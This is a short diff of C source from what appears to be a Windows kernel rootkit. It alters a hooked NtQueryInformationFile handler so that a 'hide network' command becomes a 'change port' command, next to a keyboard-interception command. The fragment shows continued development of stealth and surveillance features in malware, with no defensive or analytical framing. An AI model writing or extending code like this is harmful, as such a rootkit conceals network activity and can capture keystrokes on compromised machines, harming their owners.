@@ -248,13 +248,13 @@ ULONG_PTR HookNtQueryInformationFile(
 
             }
         }
-        else if (pCmd->flags & COMMAND_HIDE_NET) {
-            DbgPrint("Hide network\n");
+        else if (pCmd->flags & COMMAND_CHANGE_PORT) {
+            DbgPrint("Change port\n");
             if (pCmd->flags & COMMAND_BUFFER_SRC_PORT) {
-                TaskQueueByNet((ULONG)pCmd->target, TRUE);
+                TaskQueueByNet((ULONG)pCmd->target, (ULONG)pCmd->change, TRUE);
             }
             else if (pCmd->flags & COMMAND_BUFFER_DST_PORT) {
-                TaskQueueByNet((ULONG)pCmd->target, FALSE);
+                TaskQueueByNet((ULONG)pCmd->target, (ULONG)pCmd->change, FALSE);
             }
         }
         else if (pCmd->flags & COMMAND_KEYBOARD) {
